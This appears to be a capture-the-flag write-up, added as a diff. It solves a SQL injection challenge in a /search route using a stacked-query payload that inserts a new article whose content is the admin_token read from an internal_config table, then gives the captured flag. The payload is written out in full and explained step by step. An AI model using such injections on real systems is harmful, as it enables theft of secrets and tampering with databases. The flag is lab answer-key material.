@@ -1,0 +1,13 @@
+This is the query which breaks the DB and insert a new article.
+
+x%'; INSERT INTO articles (department_id, title, slug, content, author) VALUES (1, 'Pwned', 'flag-article', (SELECT value FROM internal_config WHERE key='admin_token'), 'Hacker'); --
+
+The vulnerability is inside the /search route, because the query takes directly user inputs. No data are return to the screen in case of UNION query. The solution is to inject, with an INSERT, a new article and set the content of the article as the flag.
+The flag is stored inside internal_config table where key= ‘admin_token’
+
+1. SELECT ... WHERE a.title LIKE '%x%'; — Your x%'; closes the first string and finishes the original SELECT statement.
+2. INSERT INTO articles ...; — This executes as a completely separate command, grabbing the flag from internal_config and making it the content of a new article.
+3. — %' OR a.content LIKE '%... — The -- comments out the rest of the broken query, including the second time the application tries to insert your q payload.
+
+Flag: offsec{st4ck3d_qu3r1es_EHhoobv7L1QlXE1p}
+
